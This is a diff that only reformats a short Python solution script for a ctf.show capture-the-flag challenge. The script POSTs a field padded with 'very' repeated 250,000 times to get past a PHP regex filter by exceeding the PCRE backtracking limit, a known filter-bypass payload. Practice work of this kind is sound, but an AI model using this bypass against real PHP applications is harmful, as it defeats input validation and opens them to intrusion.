@@ -4,9 +4,10 @@ PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设�
 
 """
 import requests
-url="http://d5159e98-0c60-4558-98ca-1a4dc9ae2613.challenge.ctf.show/"
-data={
-	'f':'very'*250000+'36Dctfshow'
+
+url = "http://d5159e98-0c60-4558-98ca-1a4dc9ae2613.challenge.ctf.show/"
+data = {
+    'f': 'very' * 250000 + '36Dctfshow'
 }
-r=requests.post(url,data=data)
+r = requests.post(url, data=data)
 print(r.text)
